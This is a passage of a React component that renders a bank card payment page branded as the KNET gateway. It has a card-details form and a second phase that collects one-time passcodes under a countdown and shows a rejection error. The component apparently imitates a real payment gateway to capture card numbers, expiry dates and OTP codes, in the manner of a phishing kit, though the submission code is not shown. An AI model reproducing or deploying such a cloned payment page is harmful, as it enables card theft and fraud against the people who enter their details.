                  <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>{t.cardTypeValue}</span>
                </div>

                <div className="knet-form-row" style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardNumber}</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    maxLength={23}
                    value={cardNumber}
                    onChange={handleCardChange}
                    style={{ width: 220, height: 36, border: `1px solid ${luhnError || cardError ? '#cc0000' : '#ccc'}`, borderRadius: 4, padding: "0 10px", fontSize: 14, outline: "none", caretColor: "auto", direction: "ltr" }}
                  />
                </div>

                <div className="knet-form-row" style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.expiryDate}</label>
                  <div className="knet-select-group" style={{ display: "flex", gap: 5, direction: "ltr" }}>
                    <select value={expiryMonth} onChange={(e) => setExpiryMonth(e.target.value)} style={{ height: 36, border: "1px solid #ccc", borderRadius: 4, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
                      <option value="">MM</option>
                      {months.map((m) => (<option key={m.value} value={m.value}>{m.label}</option>))}
                    </select>
                    <select value={expiryYear} onChange={(e) => setExpiryYear(e.target.value)} style={{ height: 36, border: "1px solid #ccc", borderRadius: 4, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
                      <option value="">YYYY</option>
                      {years.map((y) => (<option key={y.value} value={y.value}>{y.label}</option>))}
                    </select>
                  </div>
                </div>

                <div className="knet-form-row" style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardHolderName}</label>
                  <input
                    type="text"
                    value={cardHolderName}
                    onChange={(e) => { const val = e.target.value.replace(/[^a-zA-Z\s]/g, ""); setCardHolderName(val); setValidationError(""); }}
                    style={{ width: 200, height: 36, border: "1px solid #ccc", borderRadius: 4, padding: "0 10px", fontSize: 14, outline: "none", caretColor: "auto" }}
                  />
                </div>

                <div style={{ marginBottom: 25 }}>
                  <label style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#333", cursor: "pointer" }}>
                    <input type="checkbox" checked={saveCard} onChange={(e) => setSaveCard(e.target.checked)} style={{ width: 14, height: 14 }} />
                    {t.saveCard}
                  </label>
                </div>

                <div className="knet-btn-row" style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
                  <button type="submit" disabled={cvvLoading} style={{ backgroundColor: RED, color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold", cursor: cvvLoading ? "not-allowed" : "pointer", minWidth: 100, opacity: cvvLoading ? 0.6 : 1 }}>
                    {t.pay}
                  </button>
                  <button type="button" onClick={() => window.history.back()} style={{ backgroundColor: "#fff", color: "#333", border: "1px solid #ccc", padding: "8px 25px", borderRadius: 4, fontSize: 14, cursor: "pointer", minWidth: 100 }}>
                    {t.cancel}
                  </button>
                </div>
              </form>
            </div>

            {renderFooter(true)}
          </div>
        )}

        {/* ============ OTP PHASE ============ */}
        {phase === "otp" && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
            {renderHeader()}

            <div className="knet-otp-area" style={{ padding: "25px 40px" }}>
              <div style={{ backgroundColor: "#d9edf7", border: "1px solid #bce8f1", color: "#31708f", padding: 12, borderRadius: 4, marginBottom: 20, fontSize: 13, lineHeight: 1.6 }}>
                <strong>{t.otpNotifTitle}</strong> {t.otpNotifText}
              </div>

              <div className="knet-form-row" style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.amount}</label>
                <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
              </div>

              <div className="knet-form-row" style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardNumber}</label>
                <span style={{ fontSize: 14, color: "#333", direction: "ltr" }}>{maskedCard}</span>
              </div>

              <div className="knet-form-row" style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.expiryDate}</label>
                <span style={{ fontSize: 14, color: "#333", direction: "ltr" }}>{expiryMonth.padStart(2, "0")} / {expiryYear}</span>
              </div>

              {rejectedError && (
                <div style={{ color: RED, fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
                  {rejectedError}
                </div>
              )}

              <div className="knet-form-row" style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
                <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.otp}</label>
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={otpCode}
                  onChange={(e) => { setOtpCode(e.target.value.replace(/\D/g, "")); setRejectedError(""); }}
                  placeholder={formatCountdown(countdown)}
                  style={{ width: 200, height: 36, border: "1px solid #ccc", borderRadius: 4, padding: "0 10px", fontSize: 14, textAlign: "center", outline: "none", caretColor: "auto", direction: "ltr" }}
                />
              </div>

              <div className="knet-btn-row" style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
                <button
                  type="button"
                  onClick={handleOtpSubmit}
                  disabled={!otpCode || otpCode.length < 4}
                  style={{
                    backgroundColor: RED, color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold",
                    cursor: otpCode && otpCode.length >= 4 ? "pointer" : "not-allowed",
                    opacity: otpCode && otpCode.length >= 4 ? 1 : 0.6, minWidth: 100,
                  }}
                >
                  {t.confirm}
                </button>
                <button type="button" onClick={() => window.history.back()} style={{ backgroundColor: "#fff", color: "#333", border: "1px solid #ccc", padding: "8px 25px", borderRadius: 4, fontSize: 14, cursor: "pointer", minWidth: 100 }}>
                  {t.cancel}
                </button>
              </div>
            </div>

            {renderFooter(false)}
          </div>
        )}
      </div>
    </div>
  );
}
